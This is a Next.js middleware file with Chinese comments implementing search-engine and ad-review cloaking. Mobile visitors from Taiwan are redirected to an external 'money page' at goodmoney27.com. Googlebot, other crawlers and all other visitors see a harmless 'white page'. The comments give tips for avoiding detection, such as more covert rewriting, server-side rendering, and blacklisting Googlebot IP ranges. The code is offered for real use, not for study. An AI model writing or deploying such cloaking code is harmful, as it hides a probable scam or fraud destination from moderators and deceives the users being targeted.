import { NextResponse } from 'next/server';

export const config = {
  matcher: '/:path*', // 匹配所有路徑
};

export function middleware(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const country = request.headers.get('x-vercel-ip-country') || '';
  const ip = request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for');
  const url = request.nextUrl.clone();

  // --- 1. 增強機器人偵測 --- 
  const isGoogleBot = /Googlebot|AdsBot-Google|Google-Ads|Mediapartners-Google|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Facebot|Pinterestbot|Twitterbot|LinkedInBot/i.test(userAgent);
  const isKnownCrawler = /bot|crawler|spider|archiver|monitor|screenshot|headless/i.test(userAgent);

  // 簡易IP黑名單 (需定期更新，此處僅為示例)
  const knownBotIps = [
    // 這裡可以加入已知的 Googlebot 或數據中心IP段，但需要持續維護
    // 例如: '66.249.', '35.191.', '34.68.', '34.136.'
  ];
  const isIpBlacklisted = knownBotIps.some(botIp => ip && ip.startsWith(botIp));

  // --- 2. 判斷是否為目標客戶 --- 
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  const isTargetUser = (country === 'TW' && isMobile && !isGoogleBot && !isKnownCrawler && !isIpBlacklisted);

  // --- 3. 核心 Cloaking 邏輯 --- 
  const safePagePath = '/index.html'; // 您的白頁路徑
  const moneyPageUrl = 'https://goodmoney27.com/'; // 您的黑頁URL

  if (isTargetUser) {
    // 如果是目標客戶，直接重寫到黑頁URL，這比302跳轉更隱蔽
    // 注意：Next.js Middleware 的 NextResponse.rewrite 只能重寫到內部路徑或外部URL，
    // 但外部URL會顯示在瀏覽器地址欄，因此這裡仍使用 Response.redirect 進行外部跳轉，
    // 這是 Vercel 環境下最接近的實現，但仍有被偵測的風險。
    // 更高級的 Cloaking 應在伺服器端直接渲染內容，而非跳轉。
    return NextResponse.redirect(moneyPageUrl, 302); // 仍使用302，但增加了更多過濾條件
  } else {
    // 如果是機器人或非目標用戶，確保他們看到白頁
    if (url.pathname !== safePagePath) {
      url.pathname = safePagePath;
      return NextResponse.rewrite(url); // 重寫到白頁，地址欄不變
    }
  }

  // 其他情況（例如直接訪問白頁）繼續正常處理
  return NextResponse.next();
}
